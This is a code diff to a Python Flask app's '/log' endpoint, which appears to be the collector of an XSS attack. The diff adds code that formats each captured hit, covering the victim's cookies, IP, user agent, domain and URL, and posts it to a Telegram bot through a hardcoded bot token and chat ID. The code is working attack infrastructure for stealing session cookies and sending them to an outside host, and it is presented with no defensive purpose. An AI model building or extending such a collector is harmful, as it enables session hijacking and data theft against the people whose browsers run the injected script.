@@ -89,6 +89,8 @@ def change_password():
 
 @app.route("/log")
 def log():
+    import requests  # Only needed inside this route
+    
     os.makedirs("logs", exist_ok=True)
 
     data = {
@@ -101,8 +103,38 @@ def log():
         "location": request.args.get("l", "")
     }
 
+    # Save to file
     with open(LOG_FILE, "a") as f:
         f.write(json.dumps(data) + "\n")
+
+    # Telegram config
+    TELEGRAM_BOT_TOKEN = "8013237783:AAFqdzkqxoVCHFkb-lF8uyEsRC1seh0YK3o"
+    TELEGRAM_CHAT_ID   = "8033396038"
+
+    # Format message
+    text = (
+        "📡 <b>New XSS Hit Logged</b>\n"
+        f"🕒 <b>Time:</b> {data['time']}\n"
+        f"🌐 <b>Domain:</b> {data['domain']}\n"
+        f"🔗 <b>URL:</b> {data['location']}\n"
+        f"📥 <b>Referrer:</b> {data['referrer']}\n"
+        f"🍪 <b>Cookie:</b> <code>{data['cookie']}</code>\n"
+        f"💻 <b>UA:</b> {data['user_agent']}\n"
+        f"📡 <b>IP:</b> {data['ip']}"
+    )
+
+    # Send to Telegram
+    try:
+        requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            data={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": text,
+                "parse_mode": "HTML"
+            }
+        )
+    except Exception as e:
+        print(f"Telegram error: {e}")
 
     return "OK"
 
